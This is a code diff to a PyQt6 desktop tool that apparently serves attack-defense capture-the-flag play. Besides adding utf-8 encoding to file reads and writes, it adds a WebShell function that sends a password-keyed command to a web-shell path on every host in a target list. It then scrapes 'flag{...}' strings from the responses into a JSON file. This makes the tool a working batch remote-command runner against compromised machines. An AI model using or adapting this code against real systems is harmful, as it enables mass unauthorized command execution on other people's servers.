@@ -1,5 +1,6 @@
 import json
 import logging
+import re
 
 import requests
 from PyQt6.QtCore import Qt, pyqtSignal
@@ -161,7 +162,7 @@ class subWindow1(QFrame):
 
     def loadHosts(self):
         try:
-            with open('./data/ip.json', 'r') as f:
+            with open('./data/ip.json', 'r', encoding='utf-8') as f:
                 hosts = json.load(f)
                 for host in hosts:
                     ip = host["ip"]
@@ -174,7 +175,7 @@ class subWindow1(QFrame):
     def saveHosts(self):
         try:
             self.aliveHosts.sort()
-            with open('./data/ip.json', 'w') as f:
+            with open('./data/ip.json', 'w', encoding='utf-8') as f:
                 hosts = [{"ip": host} for host in self.aliveHosts]
                 json.dump(hosts, f)
             self._fileUpdateEvent.trigger()
@@ -239,7 +240,7 @@ class subWindow1(QFrame):
         self.list.clear()
         self.addItemSlot("存活靶机")
         self.aliveHosts = []
-        with open('./data/ip.json', 'w') as f:
+        with open('./data/ip.json', 'w', encoding='utf-8') as f:
             json.dump([], f)
         self._fileUpdateEvent.trigger()
 
@@ -281,7 +282,7 @@ class subWindow2(QFrame):
         self.stopButton = PushButton("停止执行", self)
         self.execState = "stopped"
         self.method = ComboBox()
-        items = ['GET', 'POST']
+        items = ['POST', 'GET']
         self.method.addItems(items)
         pathLayout.addWidget(self.pathLabel)
         pathLayout.addWidget(self.icon)
@@ -311,7 +312,7 @@ class subWindow2(QFrame):
         setFont(self.regexLabel, 18)
         self.regex = LineEdit()
         self.regex.setFixedWidth(150)
-        self.regex.setPlaceholderText("flag{")
+        self.regex.setPlaceholderText("flag")
         paramLayout.addWidget(self.regexLabel)
         paramLayout.addWidget(self.regex)
         paramLayout.addStretch(1)
@@ -347,6 +348,7 @@ class subWindow2(QFrame):
         layout.addLayout(leftLayout)
         layout.addLayout(rightLayout)
         self.loadHosts()
+        self.execButton.clicked.connect(self.WebShell)
 
     def addItemSlot(self, item):
         try:
@@ -363,7 +365,7 @@ class subWindow2(QFrame):
         try:
             self.list.clear()
             self.addItemSlot("存活靶机")
-            with open('./data/ip.json', 'r') as f:
+            with open('./data/ip.json', 'r', encoding='utf-8') as f:
                 hosts = json.load(f)
                 for host in hosts:
                     ip = host["ip"]
@@ -371,6 +373,41 @@ class subWindow2(QFrame):
                     self.addItemSlot(ip)
         except Exception as e:
             logging.error(e)
+
+    def WebShell(self):
+        path = self.path.text()
+        method = self.method.currentText()
+        passwd = self.passwd.text()
+        command = self.command.text()
+        regex = self.regex.text()
+        if regex != "":
+            regex += "{.*}"
+        resultList = []
+
+        try:
+            with open('./data/ip.json', 'r', encoding='utf-8') as f:
+                hosts = json.load(f)
+            for host in hosts:
+                ip = host["ip"]
+                url = f"{ip}{path}"
+                data = {passwd: command}
+                res = ""
+                if method == "GET":
+                    res = requests.get(url, params=data, timeout=0.3)
+                elif method == "POST":
+                    res = requests.post(url, data=data, timeout=0.3)
+                self.log.append(f"{url}: \n{res.text}")
+                if regex != "":
+                    result = re.findall(regex, res.text)
+                    if result:
+                        resultList.append(result[0])
+            resultList.sort()
+            with open('./data/flag.json', 'w', encoding='utf-8') as f:
+                results = [{"flag": result} for result in resultList]
+                json.dump(results, f)
+        except Exception as e:
+            logging.error(e)
+            pass
 
 
 class Event:
